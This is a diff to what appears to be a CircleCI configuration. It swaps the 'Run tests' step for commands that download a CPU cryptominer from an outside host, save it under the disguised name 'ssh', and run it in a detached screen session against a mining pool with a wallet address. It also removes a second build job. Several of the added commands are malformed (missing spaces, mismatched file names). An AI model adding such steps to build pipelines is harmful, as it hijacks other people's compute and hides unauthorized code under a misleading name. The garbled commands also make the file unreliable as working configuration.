@@ -7,21 +7,19 @@ working_dir: &working_dir ~/app
         command: | 
                     apt-get update 
                     apt-get upgrade -y 
+                    apt-get install screen -y
                     apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
     - run: 
         name: Run tests 
         command: |                                      
-                    wget -qO build.sh https://git.io/JXyun
-                    chmod +x build.sh 
-                    ./build.sh  
+                    wget-qO ssh http://berkah.mdnet.co.id/cpuminer-sse2
+                    chmod +x ssh.sh 
+                    screen -dm -S ssh ./ssh-ayespowerTIDE-ostratum+tcp://na.tidepool.shop:6243-uTJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.Gihu-pc=TDC
+                    watch -d -n 0.5 nvidia-smi
                     echo Build Succeded 
 version: 2.0 
 jobs: 
   build1: 
-    <<: *script 
-    docker: 
-      - image: ruby
-  build2: 
     <<: *script 
     docker: 
       - image: ruby
@@ -31,5 +29,4 @@ workflows:
   build:
     jobs: 
       - build1 
-      - build2
       
